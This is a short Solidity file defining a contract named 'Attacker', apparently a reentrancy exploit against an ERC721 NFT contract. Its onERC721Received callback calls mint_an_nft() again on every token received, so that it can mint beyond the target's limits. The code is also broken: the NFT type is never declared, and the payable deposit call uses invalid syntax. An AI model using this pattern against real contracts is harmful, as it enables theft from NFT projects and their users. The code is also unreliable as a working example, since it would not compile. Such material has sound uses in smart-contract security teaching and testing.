pragma solidity ^0.8.7;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Attacker is IERC721Receiver {
  NFT implementation;
  

  constructor(address _implementation) {
    implementation = NFT(_implementation);
    
  }

  function beginMint() external {
    implementation.deposit().send(0.001 ether);
    
  }

  function onERC721Received(
    address,
    address,
    uint256,
    bytes memory
  ) public virtual override returns (bytes4) {
    
    implementation.mint_an_nft();
    
    return this.onERC721Received.selector;
  }
}